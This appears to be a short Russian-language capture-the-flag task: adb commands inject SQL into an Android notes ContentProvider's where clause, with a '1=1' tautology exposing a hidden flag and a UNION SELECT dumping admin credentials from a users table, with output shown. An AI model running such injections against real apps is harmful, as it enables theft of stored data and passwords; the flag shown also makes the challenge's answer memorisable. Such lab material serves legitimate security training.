# Задача: SQLi в ContentProvider

Подтверди инъекцию и вытащи скрытую строку.

TABLE notes(_id, title, body)
TABLE users(_id, username, password)

$ adb shell content query --uri content://com.example.notes.provider/notes --where "title=Hello"
Row: 0 _id=1, title=Hello, body=world

$ adb shell content query --uri content://com.example.notes.provider/notes --where "1=1"
Row: 0 _id=1, title=Hello, body=world
Row: 1 _id=2, title=Secret, body=nto{pr0v1d3r_sql1_pr0j3ct10n}

$ adb shell content query --uri content://com.example.notes.provider/notes --where "1=0 UNION SELECT username,password,3 FROM users--"
Row: 0 _id=admin, title=admin, body=s3cr3t
